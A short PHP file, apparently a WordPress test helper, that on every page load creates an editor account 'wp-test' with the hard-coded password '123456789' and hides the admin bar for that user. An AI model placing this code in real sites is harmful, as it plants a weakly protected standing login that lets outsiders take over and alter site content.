<?php

function wptest_new_user() {
  $role     = 'editor';
  $username = 'wp-test';
  $password = '123456789';
  $email    = 'wptest@elementor.com';

  if ( !email_exists( $email ) ) {
    $new_user = wp_create_user( $username, $password, $email );
    $user = new WP_User( $new_user );
    $user->set_role( $role );
  }
}

add_action( 'init', 'wptest_new_user' );

function wptest_hide_adminbar() {
  $user = wp_get_current_user();
  if( is_user_logged_in() && ( $user->user_login == 'wp-test' ) ) {
    add_filter( 'show_admin_bar', '__return_false' );
  }
}

add_action( 'init', 'wptest_hide_adminbar' );
